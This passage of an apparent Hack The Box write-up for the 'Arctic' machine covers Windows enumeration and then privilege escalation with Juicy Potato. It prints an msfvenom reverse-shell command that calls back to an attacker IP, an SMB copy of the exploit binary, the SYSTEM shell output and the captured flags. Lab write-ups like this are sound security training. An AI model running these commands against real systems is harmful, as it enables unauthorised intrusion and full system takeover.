+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Hybrid
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Local Area Connection:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-50-6E
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span><span class="z-text z-plain">   IPv4 Address. . . . . . . . . . . : 10.10.10.11(Preferred) 
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Tunnel adapter isatap.{79F1B374-AC3C-416C-8812-BF482D048A22}:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Media State . . . . . . . . . . . : Media disconnected
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Tunnel adapter Local Area Connection* 9:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Media State . . . . . . . . . . . : Media disconnected
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span></code></pre>
+<p>Looks like there's a single network.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all local users using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName Users <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-single z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&#39;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&#39;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> GroupName<span class="z-keyword z-operator z-other z-powershell">,</span> MemberName<span class="z-keyword z-operator z-other z-powershell">,</span> SID <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName MemberName   SID                      
+</span><span class="z-text z-plain">--------- ----------   ---                      
+</span><span class="z-text z-plain">Users     ARCTIC\tolis S-1-5-21-2913191377-1678605233-910955532-1000
+</span></code></pre>
+<p>It looks like there's only us, <code>tolis</code>.</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's enumerate all local groups, once again using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroup</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> GroupName<span class="z-keyword z-operator z-other z-powershell">,</span> Comment <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Out-String</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Width <span class="z-constant z-numeric z-integer z-powershell">4096</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName                      Comment                                
+</span><span class="z-text z-plain">---------                      -------                                
+</span><span class="z-text z-plain">Administrators                 Administrators have complete and unrestricted access to the computer/domain
+</span><span class="z-text z-plain">Backup Operators               Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+</span><span class="z-text z-plain">Certificate Service DCOM Access Members of this group are allowed to connect to Certification Authorities in the enterprise
+</span><span class="z-text z-plain">Cryptographic Operators        Members are authorized to perform cryptographic operations.
+</span><span class="z-text z-plain">Distributed COM Users          Members are allowed to launch, activate and use Distributed COM objects on this machine.
+</span><span class="z-text z-plain">Event Log Readers              Members of this group can read event logs from local machine
+</span><span class="z-text z-plain">Guests                         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+</span><span class="z-text z-plain">IIS_IUSRS                      Built-in group used by Internet Information Services.
+</span><span class="z-text z-plain">Network Configuration Operators Members in this group can have some administrative privileges to manage configuration of networking features
+</span><span class="z-text z-plain">Performance Log Users          Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+</span><span class="z-text z-plain">Performance Monitor Users      Members of this group can access performance counter data locally and remotely
+</span><span class="z-text z-plain">Power Users                    Power Users are included for backwards compatibility and possess limited administrative powers
+</span><span class="z-text z-plain">Print Operators                Members can administer domain printers 
+</span><span class="z-text z-plain">Remote Desktop Users           Members in this group are granted the right to logon remotely
+</span><span class="z-text z-plain">Replicator                     Supports file replication in a domain  
+</span><span class="z-text z-plain">Users                          Users are prevented from making accidental or intentional system-wide changes and can run most applications
+</span></code></pre>
+<p>Looks classic.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>Let's gather more information about us.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> net user tolis
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">User name                    tolis
+</span><span class="z-text z-plain">Full Name                    tolis
+</span><span class="z-text z-plain">Comment                      
+</span><span class="z-text z-plain">User&#39;s comment               
+</span><span class="z-text z-plain">Country code                 000 (System Default)
+</span><span class="z-text z-plain">Account active               Yes
+</span><span class="z-text z-plain">Account expires              Never
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Password last set            22/3/2017 8:07:58
+</span><span class="z-text z-plain">Password expires             Never
+</span><span class="z-text z-plain">Password changeable          22/3/2017 8:07:58
+</span><span class="z-text z-plain">Password required            Yes
+</span><span class="z-text z-plain">User may change password     Yes
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Workstations allowed         All
+</span><span class="z-text z-plain">Logon script                 
+</span><span class="z-text z-plain">User profile                 
+</span><span class="z-text z-plain">Home directory               
+</span><span class="z-text z-plain">Last logon                   25/12/2023 7:32:01
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Logon hours allowed          All
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Local Group Memberships      *Users                
+</span><span class="z-text z-plain">Global Group memberships     *None                 
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We don't belong to interesting groups.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> type <span class="z-variable z-other z-readwrite z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span><span class="z-support z-variable z-drive z-powershell">env:</span>USERPROFILE</span>\Desktop\user.txt
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">c897ac7e47c2b03be5f8f7ef96947805
+</span></code></pre>
+<p>There's nothing unusual though.</p>
+<h2 id="command-history">Command history</h2>
+<p>If we look for a command history file, we find none.</p>
+<h2 id="tokens">Tokens</h2>
+<p>Let's now focus on our tokens.</p>
+<p>Which security groups are associated with our access tokens?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> whoami <span class="z-keyword z-operator z-assignment z-powershell">/</span>groups
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GROUP INFORMATION
+</span><span class="z-text z-plain">-----------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Group Name                           Type             SID          Attributes                                        
+</span><span class="z-text z-plain">==================================== ================ ============ ==================================================
+</span><span class="z-text z-plain">Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">Mandatory Label\High Mandatory Level Label            S-1-16-12288 Mandatory group, Enabled by default, Enabled group
+</span></code></pre>
+<p>Unfortunately, there's nothing that we can abuse.</p>
+<p>What about the privileges associated with our access tokens?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> whoami <span class="z-keyword z-operator z-assignment z-powershell">/</span>priv
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PRIVILEGES INFORMATION
+</span><span class="z-text z-plain">----------------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Privilege Name                Description                               State   
+</span><span class="z-text z-plain">============================= ========================================= ========
+</span><span class="z-text z-plain">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span><span class="z-text z-plain">SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span><span class="z-text z-plain">SeCreateGlobalPrivilege       Create global objects                     Enabled 
+</span><span class="z-text z-plain">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></code></pre>
+<p>We possess the <code>SeImpersonate</code> privilege! This is particularly interesting because it could allow us to leverage <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> to achieve code execution <code>NT AUTHORITY\SYSTEM</code>. This exploit works on Windows versions predating Windows 10 1809 and Windows Server 2019, so Arctic should be vulnerable to it.</p>
+<h1 id="privilege-escalation-juicy-potato">Privilege escalation (<a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a>)</h1>
+<p>The <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> exploit is a Windows privilege escalation technique that takes advantage of the way Windows handles token impersonation for certain COM (Component Object Model) objects when a user has the <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges. It involves creating a malicious DCOM (Distributed Component Object Model) object with a CLSID and AppID that match, and then activating it through a vulnerable process. When the COM object is activated, the exploit tricks Windows into thinking that the process is legitimate and should be granted higher privileges.</p>
+<h2 id="preparation-1">Preparation</h2>
+<p>Let's download a binary of <code>JuicyPotato</code>, which we can find <a href="https://github.com/ohpe/juicy-potato/releases">here</a>. I'll save it as <code>juicy_potato.exe</code>.</p>
+<p>Once this is done, the next step is to transfer the binary to Arctic.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> copy \\<span class="z-constant z-numeric z-integer z-powershell">10.10</span>.<span class="z-constant z-numeric z-integer z-powershell">14.5</span>\server\<span class="z-support z-function z-powershell">juicy_potato.exe</span> C:\tmp\<span class="z-support z-function z-powershell">juicy_potato.exe</span>
+</span></code></pre>
+<p>Alright, so the exploit is now on Arctic.</p>
+<p>We still need to decide which command we want to execute with this exploit. My goal is to obtain another reverse shell, so I'll setup a listener on port <code>9002</code> and I'll use <code>msfvenom</code> to create an executable:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> msfvenom<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9003<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> exe <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> /workspace/server/revshell.exe</span>
+</span></code></pre>
+<p>Let's transfer it to Arctic using the same method as for <code>juicy_potato.exe</code>.</p>
+<p>Now we should be ready to go!</p>
+<h2 id="exploitation-1">Exploitation</h2>
+<p>Time to use this binary to execute our <code>revshell.exe</code> executable as <code>NT AUTHORITY\SYSTEM</code>!</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> C:\tmp\<span class="z-support z-function z-powershell">juicy_potato.exe</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>l <span class="z-constant z-numeric z-integer z-powershell">1337</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>p C:\tmp\<span class="z-support z-function z-powershell">revshell.exe</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>t <span class="z-keyword z-operator z-assignment z-powershell">*</span>
+</span></code></pre>
+<p>And on our listener...</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.11] 49344
+</span><span class="z-text z-plain">Microsoft Windows [Version 6.1.7600]
+</span><span class="z-text z-plain">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">C:\Windows\system32&gt;
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<p>It's a standard one though, so I'll transform it into a Powershell session.</p>
+<p>If we run <code>whoami</code>, we can confirm that we are indeed <code>NT AUTHORITY\SYSTEM</code>.</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<h2 id="home-folder-1">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the root flag.</p>
+<p>And as usual, we can find it on our Desktop!</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> type C:\Users\Administrator\Desktop\root.txt
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">bfa99bc560b0acffc6a78f1a3e6b55f0
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/arctic/success.png" alt="Success" /></p>
+<p>That's it for this box! I found the foothold easy to obtain, as it only involved finding working CVEs. The privilege escalation was also kinda easy, since this is a common vector. The fact that the shells had no <code>STDERR</code> was troubling though.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
